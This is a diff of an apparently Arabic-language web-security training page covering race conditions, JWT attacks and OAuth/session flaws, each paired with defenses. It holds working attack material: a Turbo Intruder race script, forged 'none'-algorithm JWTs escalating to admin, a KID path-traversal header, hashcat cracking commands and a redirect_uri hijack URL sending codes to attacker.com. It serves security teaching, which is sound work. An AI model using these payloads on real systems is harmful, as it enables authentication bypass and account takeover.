+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — استخدام Burp Turbo Intruder خطوة بخطوة</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Intercept Request and Send to Turbo Intruder</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">التقاط طلب إرسال الكوبون أو سحب الرصيد في Burp Suite، النقر باليمين واختيار <code>Extensions → Turbo Intruder → Send to Turbo Intruder</code>.</p>
+          </div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🔄</span> 3. سيناريوهات استغلال معقدة (Multi-Endpoint Race Conditions)</h3></div>
-          <ul class="t-check-list">
-            <li><strong>تفعيل الحساب قبل الدفع (Bypassing Payment Flow):</strong> <br>طلب (أ): شراء منتج (معلق بانتظار الدفع).<br>طلب (ب): إلغاء الطلب المتبوع باسترداد المبلغ.<br>سباق الطلبين قد يؤدي لاسترداد مبلغ لم تقم بدفعه أساساً بسبب تداخل العمليات.</li>
-            <li><strong>تخطي توثيق الـ 2FA (Multi-Step Bypass):</strong><br>طلب (أ): طلب رمز 2FA جديد.<br>طلب (ب): التحقق برمز قديم قبل أن يتم إبطاله من قاعدة البيانات.</li>
-          </ul>
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Configure Python Script for Concurrent Requests</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">كتابة سكريبت بايثون داخل الأداة لإطلاق الطلبات متزامنة (Gate-based synchronization) لإرسال كل الحزم في شبكة الخادم في جزء من الميكروثانية.</p>
+            <pre style="background: #282a36; padding: 15px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=1,
+                           pipeline=False)
+                           
+    # Queue multiple identical requests
+    for i in range(30):
+        engine.queue(target.req, gate='race_gate')
+        
+    # Open the gate to release all requests concurrently
+    engine.openGate('race_gate')</code></pre>
+          </div>
         </div>
-    
+      </div>
+    </div>
+  </div>
 
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p12" onclick="markPhaseComplete('p12','p14')">
-          ✅ Mark Phase Complete — Race Conditions Done → Proceed to JWT Hacking
-        </button>
+  <!-- ═══ SECTION 4: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — معالجة ثغرات التزامن</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ حماية قاعدة البيانات (Locks)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Pessimistic Locking:</strong> قفل الصف المعني في قاعدة البيانات فور بدء قراءته لمنع أي عملية تعديل متوازية حتى يكتمل الطلب الأول: <code>SELECT ... FOR UPDATE</code>.</li>
+          <li><strong>Optimistic Locking:</strong> التحقق من عدم تغيير رقم النسخة (Version column) للبيانات قبل حفظ التحديث في قاعدة البيانات.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 قفل المزامنة البرمجية (Mutexes)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Mutex / Semaphore:</strong> استخدام أقفال برمجية على مستوى الكود لمنع المعالجة المتوازية لنفس المستخدم في خيوط الاتصال المتزامنة (Threads).</li>
+          <li><strong>Unique Constraint:</strong> وضع قيود فريدة في قاعدة البيانات (مثل تفعيل حقل فريد يربط المستخدم بالكوبون المستعمل).</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- MARK COMPLETE -->
+  <button class="mark-complete-btn" id="complete-btn-p12" onclick="markPhaseComplete('p12','p15')">
+    ✅ Mark Phase Complete — Race Conditions Done → Proceed to Cloud Security
+  </button>
+
 </div>
+
       </div>
 
       <!-- Phase 14: JWT Hacking -->
-      <div class="meth-content-view" id="meth-content-p14" style="display: none; --tool-color: #d946ef;">
+<div class="meth-content-view" id="meth-content-p14" style="display: none; --tool-color: #d946ef;" dir="rtl">
 
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🎫</span> JSON Web Tokens (JWT) - Deep Dive</h2>
-          <p class="hero-tagline">منهجية تزوير التوقيعات، كسر التشفير، واستغلال ترويسات الـ JWK و JKU لتخطي التوثيق</p>
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🎫</span> JWT Attacks &amp; Hacking — اختراق رموز JWT</h2>
+    <p class="hero-tagline">منهجية تزوير التوقيعات، كسر التشفير، واستغلال ترويسات JWK/JKU و Directory Traversal لتخطي التوثيق</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Burp JWT Editor · jwt_tool · Hashcat</span>
+      <span class="badge badge-info">📋 OWASP: Broken Authentication | API Security</span>
+      <span style="background: rgba(217,70,239,0.15); color: #d946ef; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High → Critical (Auth Bypass)</span>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 2: THEORY — JWT Structure & Signature ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — تشريح رمز JWT وعلاقة التوقيع بالأمان</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        الـ <strong>JSON Web Token (JWT)</strong> هو معيار مفتوح (RFC 7519) لنقل البيانات بين خادم وعميل بشكل مضغوط وآمن. يتكون الرمز من ثلاثة أجزاء مفصولة بنقاط (<code>.</code>) ومقروءة بصيغة <strong>Base64URL</strong>:
+      </p>
+      
+      <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-top: 15px; font-family: monospace; font-size: 0.85rem;" dir="ltr">
+        <div style="background: rgba(217,70,239,0.05); border: 1px solid rgba(217,70,239,0.2); padding: 12px; border-radius: 6px;">
+          <strong style="color: #d946ef;">1. Header (الترويسة)</strong>
+          <p style="color: #aaa; margin-top: 5px; font-size: 0.8rem;">يحتوي على نوع الرمز وخوارزمية التوقيع.</p>
+          <pre style="color: #8be9fd; background: none; padding: 0; font-size: 0.75rem;">{
+  "alg": "HS256",
+  "typ": "JWT"
+}</pre>
+        </div>
+        <div style="background: rgba(80,250,123,0.05); border: 1px solid rgba(80,250,123,0.2); padding: 12px; border-radius: 6px;">
+          <strong style="color: #50fa7b;">2. Payload (البيانات)</strong>
+          <p style="color: #aaa; margin-top: 5px; font-size: 0.8rem;">يحتوي على البيانات الفعلية (Claims) مثل معرف المستخدم وصلاحياته.</p>
+          <pre style="color: #f1fa8c; background: none; padding: 0; font-size: 0.75rem;">{
+  "user_id": 1337,
+  "role": "user"
+}</pre>
+        </div>
+        <div style="background: rgba(255,85,85,0.05); border: 1px solid rgba(255,85,85,0.2); padding: 12px; border-radius: 6px;">
+          <strong style="color: #ff5555;">3. Signature (التوقيع)</strong>
+          <p style="color: #aaa; margin-top: 5px; font-size: 0.8rem;">ينتج عن تشفير الجزئين السابقين باستخدام مفتاح سري للتأكد من عدم التلاعب.</p>
+          <pre style="color: #ff5555; background: none; padding: 0; font-size: 0.75rem;">HMACSHA256(
+  base64Url(header) + "." +
+  base64Url(payload),
+  secret_key
+)</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — مسار تجاوز المصادقة (Auth Bypass)</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Algorithm Confusion Attack (الخلط بين الخوارزميات)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إذا كان السيرفر يستخدم خوارزمية مفتاح غير متماثل (RS256 - مفتاح عام للتأكيد ومفتاح خاص للتوقيع)، يقوم المهاجم بتغيير خوارزمية التوكن إلى متماثل (HS256) واستخدام المفتاح العام (المتاح للجميع) كسرّ متماثل للتوقيع. السيرفر الضعيف سيستخدم المفتاح العام كسرّ للتحقق، مما يتيح تزوير التوكن بالكامل.</p>
+          </div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. أساسيات الـ JWT وأخطاء التكوين (Core Configuration Flaws)</h3></div>
-          <p>يتكون الـ JWT من 3 أجزاء (Header.Payload.Signature). يعتمد أمانه كلياً على التوقيع الرقمي لمنع التلاعب. إذا قمت بتغيير <code>"role":"user"</code> إلى <code>"admin"</code> سيصبح التوقيع غير صالح. لكن يمكن تخطيه عبر:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>The "None" Algorithm Attack:</strong> قم بتغيير الخوارزمية في الترويسة من <code>"alg":"HS256"</code> إلى <code>"alg":"none"</code> (أو None, NONE). احذف التوقيع تماماً من آخر التوكن. بعض مكتبات السيرفر ستقبل التوكن وتعتبره موثقاً.</li>
-            <li>✔ <strong>Algorithm Confusion (RS256 to HS256):</strong> إذا كان السيرفر يستخدم مفتاح عام/خاص (RS256)، قم بتغيير الخوارزمية إلى HS256 (مفتاح متماثل). ثم قم بتوقيع التوكن الخاص بك باستخدام <strong>المفتاح العام</strong> للسيرفر كسرّ (Secret Key). السيرفر الذي لا يتحقق من نوع الخوارزمية بشكل صحيح سيقبل التوكن.</li>
-            <li>✔ <strong>Weak Secret Cracking:</strong> استخدم أدوات مثل <code>hashcat</code> لكسر سر الـ HS256 إذا كان ضعيفاً. <br><code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code></li>
-          </ul>
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">None Algorithm Attack (تخطى التوقيع)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تعديل ترويسة التوكن لتغيير الخوارزمية إلى <code>none</code> أو <code>None</code>، وحذف جزء التوقيع تماماً مع الاحتفاظ بالنقطة الأخيرة. إذا كان السيرفر يعتمد على الترويسة لتحديد نوع الفحص دون التحقق من بيئة التشغيل، فسيقبل التوكن دون التحقق من التوقيع.</p>
+          </div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ 2. حقن الترويسات وتزوير المفاتيح (Advanced Header Injections)</h3></div>
-          <p>بدلاً من محاولة استخراج المفتاح، ماذا لو أجبرت السيرفر على استخدام مفتاحك الخاص للتحقق من توقيعك؟</p>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الثغرة (Vulnerability)</th>
-                <th>آلية الاستغلال (Exploitation)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>JWK Header Injection</strong></td>
-                <td>الترويسة (Header) قد تحتوي على مفتاح <code>"jwk"</code> مضمّن بداخلها. قم بتوليد مفتاح RSA خاص بك، أدخل الجزء العام منه في ترويسة الـ JWK، ووقّع التوكن بالمفتاح الخاص بك. بعض السيرفرات الضعيفة ستستخدم الـ JWK المرفق للتحقق!</td>
-              </tr>
-              <tr>
-                <td><strong>JKU Parameter Abuse (SSRF)</strong></td>
-                <td>الترويسة تحتوي على <code>"jku": "https://server.com/keys.json"</code> (رابط يجلب المفاتيح). استبدلها برابط خادمك الخاص <code>"jku": "https://attacker.com/keys.json"</code>. السيرفر سيستدعي ملفك ويتحقق من التوكن بنجاح.</td>
-              </tr>
-              <tr>
-                <td><strong>KID Directory Traversal</strong></td>
-                <td>معامل <code>"kid"</code> يشير إلى اسم ملف المفتاح. يمكن استغلاله عبر حقن Directory Traversal <code>"kid": "../../../dev/null"</code> للتحقق ضد ملف فارغ، أو حقن أوامر SQL إذا كان يُقرأ من قاعدة بيانات.</td>
-              </tr>
-            </tbody>
-          </table></div>
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">Header Parameter Injection (JWK/JKU/KID)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">حقن معاملات الترويسة للتحكم في المفتاح المستخدم للتحقق:</p>
+            <ul style="color: var(--text-secondary); font-size: 0.85rem; line-height: 1.8; margin-top: 5px;">
+              <li><strong>JWK (JSON Web Key):</strong> تضمين مفتاح المهاجم العام في الترويسة مباشرة.</li>
+              <li><strong>JKU (JSON Web Key Set URL):</strong> الإشارة لرابط خارجي خاص بالمهاجم يحتوي على المفتاح العام.</li>
+              <li><strong>KID (Key ID):</strong> استغلال اسم الملف للوصول لملف ثابت مثل <code>/dev/null</code> بحيث يتم التحقق دائماً ضد قيمة فارغة أو ثابتة.</li>
+            </ul>
+          </div>
         </div>
+      </div>
+    </div>
+  </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🛠️</span> 3. أدوات التحليل (Essential Tools)</h3></div>
-          <ul class="t-check-list">
-            <li><strong>Burp Suite JWT Editor:</strong> إضافة أساسية في سويت لفك، تعديل، وتوقيع الـ JWTs، وتجربة هجمات الـ None والـ Algorithm Confusion بكبسة زر.</li>
-            <li><strong>jwt_tool:</strong> أداة بايثون سطر أوامر قوية لعمل Fuzzing آلي لكل الثغرات المعروفة في مسار الـ JWT.</li>
-          </ul>
+  <!-- ═══ SECTION 4: PAYLOAD ARSENAL ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>⚡ ترسانة الهجمات والـ Payloads</h3></div>
+    <div>
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+        <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px;">
+          <h4 style="color: var(--tool-color); margin-top: 0;">None Algorithm Signature Bypass</h4>
+          <p style="font-size: 0.85rem; color: var(--text-secondary);">تغيير <code>alg</code> إلى <code>none</code> وحذف التوقيع:</p>
+          <div class="cmd-ui-box" style="font-size: 0.8rem;">
+# Original token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoidXNlciJ9.signature
+
+# Modified token (None attack):
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoiYWRtaW4ifQ.</div>
         </div>
-    
+        <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px;">
+          <h4 style="color: #ff6e27; margin-top: 0;">KID Directory Traversal</h4>
+          <p style="font-size: 0.85rem; color: var(--text-secondary);">استغلال معامل <code>kid</code> للإشارة لملف ثابت:</p>
+          <div class="cmd-ui-box" style="font-size: 0.8rem;">
+# Target Header:
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../../dev/null"
+}
+# Sign the token against an empty string/null secret</div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p14" onclick="markPhaseComplete('p14','p13')">
-          ✅ Mark Phase Complete — JWT Hacking Done → Proceed to OAuth & Sessions
-        </button>
+  <!-- ═══ SECTION 5: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ مقارنة أدوات فحص رموز JWT</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>نقاط القوة</th>
+            <th>أمر أساسي</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">Burp JWT Editor</strong></td>
+            <td>التعديل والتوقيع التفاعلي المباشر للطلبات</td>
+            <td>سهولة توليد مفاتيح RSA وتطبيق هجوم Confusion تلقائياً</td>
+            <td>Extensions store -> JWT Editor Keys</td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">jwt_tool</strong></td>
+            <td>الفحص التلقائي و Brute Force لرموز JWT</td>
+            <td>أداة سطر أوامر شاملة وممتازة للأتمتة</td>
+            <td><code>python3 jwt_tool.py &lt;TOKEN&gt; -X a</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">Hashcat</strong></td>
+            <td>كسر السر المشترك (Secret Key) لـ HS256 أوفلاين</td>
+            <td>سرعة فائقة باستخدام طاقة كروت الشاشة</td>
+            <td><code>hashcat -m 16500 jwt.txt rockyou.txt</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 6: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين استخدام JWT</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ تأمين خوارزمية التحقق</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Enforce Algorithm:</strong> يجب فرض خوارزمية التحقق برمجياً في السيرفر بشكل ثابت (مثال: استخدام <code>jwt.verify(token, secret, { algorithms: ['HS256'] })</code>) بدلاً من الوثوق بالخوارزمية المحددة في الترويسة.</li>
+          <li><strong>Block "none" Algorithm:</strong> رفض أي توكن يستخدم خوارزمية <code>none</code> بشكل صريح ونهائي.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 تأمين المفاتيح والمقاييس</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Strong Secrets:</strong> استخدام كلمات مرور معقدة وطويلة جداً للمفاتيح المتماثلة لتجنب الكسر أوفلاين.</li>
+          <li><strong>Validate URLs:</strong> تصفية والتحقق من صحة معامل <code>jku</code> بحيث لا يقبل السيرفر جلب ملفات المفاتيح إلا من نطاق معتمد (Strict Whitelist).</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- MARK COMPLETE -->
+  <button class="mark-complete-btn" id="complete-btn-p14" onclick="markPhaseComplete('p14','p13')">
+    ✅ Mark Phase Complete — JWT Hacking Done → Proceed to OAuth &amp; Sessions
+  </button>
+
 </div>
+
       </div>
 
       <!-- Phase 13: OAuth & Sessions -->
-      <div class="meth-content-view" id="meth-content-p13" style="display: none; --tool-color: #8b5cf6;">
+<div class="meth-content-view" id="meth-content-p13" style="display: none; --tool-color: #8b5cf6;" dir="rtl">
 
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔓</span> OAuth 2.0 & Session Management - Deep Dive</h2>
-          <p class="hero-tagline">منهجية السيطرة على الحسابات (Account Takeover) عبر التلاعب بآليات المصادقة وتدفق الـ OAuth.</p>
-        </div>
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🔓</span> OAuth 2.0 &amp; Session Management — اختراق المصادقة</h2>
+    <p class="hero-tagline">منهجية السيطرة على الحسابات (Account Takeover) وعيوب بروتوكولات التفويض المفتوح وإدارة الجلسات</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Burp Suite · evilginx2 · CSRF PoC · Referer spoofing</span>
+      <span class="badge badge-info">📋 OWASP: Broken Authorization | OAuth 2.0 Security</span>
+      <span style="background: rgba(139,92,246,0.15); color: #8b5cf6; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High → Critical (Account Takeover)</span>
+    </div>
+  </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. ثغرات الـ OAuth الأساسية (OAuth Misconfigurations)</h3></div>
-          <p>الـ OAuth عملية معقدة تعتمد على إعادة التوجيه (Redirects). أبسط خطأ في التحقق يؤدي لتسريب رموز الدخول (Access Tokens).</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>تسريب الرمز عبر Redirect URI:</strong> إذا كان معامل <code>redirect_uri</code> غير مقيّد بشكل صارم (Strict Whitelist)، يمكنك استغلال ثغرة Open Redirect لسرقة الكود الخاص بالضحية وتحويله لسيرفرك: <code>redirect_uri=https://site.com/login?redirect=https://attacker.com</code></li>
-            <li>✔ <strong>OAuth CSRF (غياب معامل State):</strong> إذا لم يرسل التطبيق معامل <code>state</code> عشوائي للتحقق منه عند عودة الطلب، يمكنك إرسال رابط التفويض الخاص بك (المربوط بحسابك المهاجم) للضحية. بمجرد نقره، سيتم ربط حسابه الاجتماعي בחسابك أنت في الموقع!</li>
-            <li>✔ <strong>تسريب التوكن عبر الـ Referer:</strong> في تدفق (Implicit Flow)، يظهر الـ Token في مسار الـ URL (كـ Hash Fragment). إذا احتوت الصفحة الموجه لها على روابط خارجية أو صور، قد يتسرب الـ Token في ترويسة <code>Referer</code> لتلك الروابط الخارجية.</li>
+  <!-- ═══ SECTION 2: THEORY — OAuth Flow and Roles ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — كيف يعمل بروتوكول OAuth 2.0 والعيوب الكامنة</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        بروتوكول <strong>OAuth 2.0</strong> هو معيار تفويض مفتوح يسمح للتطبيقات الخارجية بالوصول المحدود لموارد المستخدم دون مشاركة كلمة مرور حسابه.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🔄 تدفق مصادقة كود التفويض (Authorization Code Flow)</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>1. Request:</strong> يوجه التطبيق (Client) المستخدم إلى سيرفر الـ OAuth (Provider) عبر رابط يحتوي على <code>redirect_uri</code> و <code>scope</code>.</li>
+            <li><strong>2. Consent:</strong> يوافق المستخدم على إعطاء الصلاحيات للتطبيق.</li>
+            <li><strong>3. Redirect:</strong> يعود الخادم بتوجيه المستخدم للتطبيق ومعه <code>code</code> مؤقت.</li>
+            <li><strong>4. Token Exchange:</strong> يرسل التطبيق الـ <code>code</code> والـ <code>client_secret</code> للسيرفر للحصول على <code>Access Token</code> النهائي.</li>
           </ul>
         </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ 2. ثغرات إدارة الجلسات (Session Management)</h3></div>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الثغرة (Vulnerability)</th>
-                <th>كيفية الفحص والاستغلال (Testing & Exploitation)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>Session Fixation (تثبيت الجلسة)</strong></td>
-                <td>السيرفر لا يقوم بإصدار معرف جلسة جديد (New Session ID) بعد تسجيل الدخول بنجاح. المهاجم يعطي الضحية رابطاً يحتوي على معرف جلسة (معروف للمهاجم). عندما يسجل الضحية دخوله، تصبح الجلسة "المعروفة" مفعلة بصلاحيات الضحية.</td>
-              </tr>
-              <tr>
-                <td><strong>Session Expiration Flaws (عدم الانتهاء)</strong></td>
-                <td>احتفظ بكوكي مسجل الدخول، ثم قم بتسجيل الخروج من الواجهة. حاول استخدام الكوكي القديم للوصول للصفحات المحمية. إذا نجح الأمر، فهذا يعني أن زر تسجيل الخروج يحذف الكوكي من المتصفح فقط ولكنه لا ينهي الجلسة (Invalidate) فعلياً من السيرفر.</td>
-              </tr>
-              <tr>
-                <td><strong>Concurrent Login (تزامن الجلسات)</strong></td>
-                <td>إذا غير المستخدم كلمة مروره (Password Reset)، هل يتم تسجيل الخروج تلقائياً من جميع أجهزته الأخرى؟ إذا لم يحدث ذلك، يمكن لمخترق حصل على جلسة قديمة البقاء متصلاً للأبد.</td>
-              </tr>
-            </tbody>
-          </table></div>
+        <div>
+          <h4 style="color: #ff6e27;">⚠️ المشكلة الأمنية الأساسية</h4>
+          <p>
+            تعتمد سلامة التدفق كلياً على **دقة التحقق من عنوان التوجيه (Redirect URI)**. إذا تم تزوير هذا العنوان أو استغلال ثغرة إعادة توجيه مفتوحة فيه، يمكن للمهاجم اختطاف الـ `code` أو الـ `Access Token` للضحية فوراً.
+          </p>
         </div>
-    
+      </div>
+    </div>
+  </div>
 
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p13" onclick="markPhaseComplete('p13','p15')">
-          ✅ Mark Phase Complete — OAuth & Sessions Done → Proceed to Cloud Security
-        </button>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — ثغرات OAuth الشائعة خطوة بخطوة</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Redirect URI Bypass (اختطاف كود التفويض)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إذا كان السيرفر يقبل مطابقة جزئية للرابط، يمكن للمهاجم تمرير رابط خادمه للحصول على كود التفويض:</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Original Request:
+https://provider.com/oauth/authorize?client_id=123&redirect_uri=https://victim.com/oauth
+
+# Attacker Bypass Attempt (Open Redirect on target):
+https://provider.com/oauth/authorize?client_id=123&redirect_uri=https://victim.com/oauth?redirect=https://attacker.com</div>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">OAuth CSRF (غياب معامل State)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إذا لم يرسل التطبيق معامل <code>state</code> عشوائي للتحقق منه عند عودة الطلب، يمكن للمهاجم إرسال رابط التفويض الخاص به للضحية ليربط حسابه الاجتماعي بحساب المهاجم بشكل غير مكتشف.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تحصين تطبيق OAuth</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ إعدادات الخادم والـ API</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Exact Redirect URI Matching:</strong> فرض مطابقة حرفية وصارمة لعنوان التوجيه (Strict Exact Match) بدلاً من قبول النطاقات الفرعية أو المطابقة الجزئية.</li>
+          <li><strong>Mandatory State Parameter:</strong> فرض استخدام معامل <code>state</code> عشوائي وفريد لكل مستخدم وجلسة للوقاية من هجمات CSRF.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 إدارة رموز الجلسات</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Short Authorization Code Lifespan:</strong> جعل مدة صلاحية كود التفويض قصيرة جداً (أقل من دقيقة) واستخدامه لمرة واحدة فقط.</li>
+          <li><strong>PKCE (RFC 7636):</strong> استخدام إطار PKCE لحماية التطبيقات من اختطاف كود التفويض على الأجهزة الذكية والمتصفحات.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- MARK COMPLETE -->
+  <button class="mark-complete-btn" id="complete-btn-p13" onclick="markPhaseComplete('p13','p12')">
+    ✅ Mark Phase Complete — OAuth Done → Proceed to Race Conditions
+  </button>
+
 </div>
+
       </div>
 
       <!-- Phase 15: Cloud Security -->
@@ -10395,7 +12101,134 @@ if __name__ == "__main__":
 
 </div>
 
-    </div> <!-- end meth-viewer -->
+    <div class="meth-content-view" id="meth-content-deserialization" style="display: none; --tool-color: #ff5555;" dir="rtl">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">☣️</span> Insecure Deserialization — ثغرات فك التسلسل غير الآمن</h2>
+    <p class="hero-tagline">شرح آليات استغلال فك تسلسل كائنات البيانات (Java, PHP, Python) لبناء سلاسل استغلال (Gadget Chains) والحصول على RCE</p>
